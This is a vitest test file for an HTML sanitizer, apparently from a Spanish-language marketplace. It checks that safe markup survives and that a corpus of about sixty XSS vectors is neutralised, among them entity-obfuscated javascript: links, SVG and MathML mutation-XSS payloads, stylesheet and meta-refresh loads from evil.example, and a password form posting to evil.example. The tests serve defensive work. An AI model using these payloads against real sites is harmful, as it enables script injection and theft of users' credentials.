import { describe, expect, it } from "vitest";
import { MAX_HTML_LENGTH, sanitizeHtml } from "../custom/html.js";

const clean = (input: string, options = {}) => sanitizeHtml(input, options);
const codes = (input: string, options = {}) => clean(input, options).issues.map((issue) => issue.code);

/** Things that must never survive in the output, whatever the vector. */
const FORBIDDEN = [/<script/i, /<iframe/i, /<style/i, /<svg/i, /<math/i, /<form/i, /<object/i, /<embed/i, /<link/i, /<meta/i, /<base/i, /<template/i, /\son\w+\s*=/i, /javascript:/i, /vbscript:/i, /data:text/i, /expression\(/i, /\sstyle\s*=/i, /srcdoc/i];
const attack = (input: string): string => {
  const output = clean(input).html;
  for (const pattern of FORBIDDEN) expect(output, `${pattern} in ${JSON.stringify(output)} from ${JSON.stringify(input)}`).not.toMatch(pattern);
  expect(clean(output).html, "idempotent").toBe(output);
  return output;
};

describe("sanitizeHtml: what is kept", () => {
  it("keeps text formatting, lists, tables, safe links and media-store images", () => {
    const html = '<h2 class="titulo">Hola</h2><p>Texto con <strong>negrita</strong> y <em>cursiva</em><br>otra línea</p><ul><li>uno</li></ul><table><tbody><tr><td colspan="2">x</td></tr></tbody></table><a href="https://example.com/a?b=1">enlace</a> <a href="mailto:a@b.co">correo</a> <a href="tel:+59170000000">llama</a> <a href="#faq">faq</a> <a href="/c/ana/regalos">regalos</a><img src="/media/public/assets/abc/medium" alt="Foto" width="320">';
    const result = clean(html);
    expect(result.html).toContain("<h2 class=\"titulo\">Hola</h2>");
    expect(result.html).toContain("<strong>negrita</strong>");
    expect(result.html).toContain('<td colspan="2">x</td>');
    expect(result.html).toContain('href="https://example.com/a?b=1" rel="noopener noreferrer nofollow ugc"');
    expect(result.html).toContain('href="mailto:a@b.co"');
    expect(result.html).toContain('href="tel:+59170000000"');
    expect(result.html).toContain('href="#faq"');
    expect(result.html).toContain('href="/c/ana/regalos"');
    expect(result.html).toContain('src="/media/public/assets/abc/medium" alt="Foto" width="320" loading="lazy" decoding="async"');
    expect(result.issues).toEqual([]);
  });

  it("is idempotent on clean input and returns an empty string for an empty one", () => {
    const once = clean("<p>a &amp; b &lt;c&gt;</p>").html;
    expect(once).toBe("<p>a &amp; b &lt;c&gt;</p>");
    expect(clean(once).html).toBe(once);
    expect(clean("").html).toBe("");
  });

  it("adds an empty alt and drops an image with no source", () => {
    expect(clean('<img src="/media/public/assets/x/full">').html).toContain('alt=""');
    expect(clean("<img>").html).toBe("");
  });
});

describe("sanitizeHtml: hostile corpus", () => {
  const vectors: readonly string[] = [
    "<script>alert(1)</script>",
    "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    '<img src=x onerror=alert(1)>',
    '<img src="/media/public/assets/x" onerror="alert(1)">',
    '<body onload=alert(1)>',
    '<div onmouseover="alert(1)">hover</div>',
    '<a href="javascript:alert(1)">x</a>',
    '<a href="JaVaScRiPt:alert(1)">x</a>',
    '<a href="java&#x09;script:alert(1)">x</a>',
    '<a href="java&#10;script:alert(1)">x</a>',
    '<a href="&#106;avascript:alert(1)">x</a>',
    '<a href=" javascript:alert(1)">x</a>',
    '<a href="vbscript:msgbox(1)">x</a>',
    '<a href="data:text/html,<script>alert(1)</script>">x</a>',
    '<a href="//evil.example/x">x</a>',
    '<a href="\\\\evil.example\\x">x</a>',
    '<iframe src="https://evil.example"></iframe>',
    '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
    '<object data="x.swf"></object><embed src="x.swf">',
    '<form action="https://evil.example"><input name=pw type=password><button>Enviar</button></form>',
    '<svg><script>alert(1)</script></svg>',
    '<svg onload=alert(1)><circle/></svg>',
    '<svg><foreignObject><iframe src=x></iframe></foreignObject></svg>',
    '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
    '<math><annotation-xml encoding="text/html"><script>alert(1)</script></annotation-xml></math>',
    '<style>@import url(https://evil.example/x.css);</style>',
    '<div style="position:fixed;inset:0;background:url(https://evil.example/t.gif)">x</div>',
    '<link rel=stylesheet href=https://evil.example/x.css>',
    '<meta http-equiv=refresh content="0;url=https://evil.example">',
    '<base href="https://evil.example/">',
    '<template><script>alert(1)</script></template>',
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
    '<xmp><script>alert(1)</script></xmp>',
    '<plaintext><script>alert(1)</script>',
    '<textarea><script>alert(1)</script></textarea>',
    '<select><option><script>alert(1)</script></option></select>',
    '<table><td><svg><desc><script>alert(1)</script></desc></svg></td></table>',
    '<p><svg></p><style><a title="</style><img src=x onerror=alert(1)>">',
    '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
    '<div><p><svg><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
    '<a href="https://x.example" target="_blank" onclick="alert(1)">x</a>',
    '<img src="https://evil.example/pixel.gif">',
    '<img src="data:image/svg+xml,<svg onload=alert(1)>">',
    '<img src="/media/public/assets/../../../etc/passwd">',
    '<img src="/media/public/assets/x" srcset="https://evil.example/a.png 1x">',
    '<video src=x onerror=alert(1)></video><audio src=x onerror=alert(1)></audio>',
    '<details open ontoggle=alert(1)>x</details>',
    '<marquee onstart=alert(1)>x</marquee>',
    '<isindex action=javascript:alert(1)>',
    '<div id="x" data-a="1" name="y" contenteditable autofocus tabindex=1>x</div>',
    '<!--[if IE]><script>alert(1)</script><![endif]-->',
    '<![CDATA[<script>alert(1)</script>]]>',
    '<?xml version="1.0"?><script>alert(1)</script>',
    '<a href="https://x.example"><a href="javascript:alert(1)">y</a></a>',
    '<p class="a" class="b" onclick="alert(1)">x</p>',
    "<b><i>mal cerrado <script>alert(1)",
    '<img src=`x` onerror=alert(1)>',
    '<div/onclick=alert(1)>x</div>',
    '<a href="https://x.example/&quot; onmouseover=&quot;alert(1)">x</a>'
  ];

  it.each(vectors)("neutralises %s", (vector) => { attack(vector); });

  it("removes the content of dangerous containers, not only the tag", () => {
    expect(clean("<p>antes</p><script>secret()</script><p>después</p>").html).toBe("<p>antes</p><p>después</p>");
    expect(clean("<style>body{display:none}</style>x").html).toBe("x");
    expect(clean("<svg><text>visible?</text></svg>y").html).toBe("y");
  });

  it("drops style and event attributes but keeps the element's content", () => {
    expect(clean('<p style="color:red" onclick="x()">hola</p>').html).toBe("<p>hola</p>");
  });

  it("only https, mailto, tel, in-page and site-relative links survive, with their issue code", () => {
    expect(clean('<a href="ftp://x.example/f">x</a>').html).toBe("<a>x</a>");
    expect(codes('<a href="ftp://x.example/f">x</a>')).toContain("URL_REJECTED");
    expect(clean('<a href="http://x.example">x</a>').html).toBe("<a>x</a>");
    expect(clean('<a href="//x.example">x</a>').html).toBe("<a>x</a>");
    expect(clean('<a href="foo/bar">x</a>').html).toBe("<a>x</a>");
  });

  it("a direct link to a registered provider loses its href (leads only count through /r/{listingId})", () => {
    const options = { isProviderHost: (host: string) => host === "proveedor.example" || host.endsWith(".proveedor.example") };
    expect(clean('<a href="https://tienda.proveedor.example/x">comprar</a>', options).html).toBe("<a>comprar</a>");
    expect(codes('<a href="https://PROVEEDOR.example/x">c</a>', options)).toContain("PROVIDER_LINK");
    expect(clean('<a href="https://otro.example/x">ok</a>', options).html).toContain('href="https://otro.example/x"');
    expect(clean('<a href="/r/11111111-1111-1111-1111-111111111111">ok</a>', options).html).toContain('href="/r/11111111-1111-1111-1111-111111111111"');
  });

  it("images only from the media store, or from the prefixes the caller allows", () => {
    expect(clean('<img src="https://cdn.example/media/a.webp" alt="x">').html).toBe("");
    expect(clean('<img src="https://cdn.example/media/a.webp" alt="x">', { mediaPrefixes: ["https://cdn.example/media/"] }).html).toContain('src="https://cdn.example/media/a.webp"');
    expect(clean('<img src="/media/public/assets/a//b" alt="x">').html).toBe("");
  });

  it("class names are restricted to plain identifiers", () => {
    expect(clean('<p class="ok bad;name x{y} 9no _fine">t</p>').html).toBe('<p class="ok _fine">t</p>');
    expect(clean('<p class="9no">t</p>').html).toBe("<p>t</p>");
  });

  it("refuses to be fooled by mutation XSS: whatever remains parses to itself", () => {
    for (const vector of ['<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>', "<noscript><style></noscript><img src=x onerror=alert(1)>", '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">']) attack(vector);
  });

  it("limits length, depth and node count", () => {
    const big = clean(`<p>${"a".repeat(MAX_HTML_LENGTH)}</p>`);
    expect(big.html).toBe("");
    expect(big.issues[0]?.code).toBe("TOO_LONG");
    const deep = clean("<div>".repeat(40) + "x" + "</div>".repeat(40));
    expect(deep.issues.some((issue) => issue.code === "TOO_DEEP")).toBe(true);
    expect((deep.html.match(/<div>/g) ?? []).length).toBeLessThanOrEqual(24);
    const many = clean("<b>x</b>".repeat(2100));
    expect(many.issues.some((issue) => issue.code === "TOO_MANY_NODES")).toBe(true);
  });

  it("unwraps unknown tags keeping their text", () => {
    expect(clean("<custom-tag>hola <b>mundo</b></custom-tag>").html).toBe("hola <b>mundo</b>");
    expect(codes("<custom-tag>x</custom-tag>")).toContain("TAG_UNWRAPPED");
  });
});
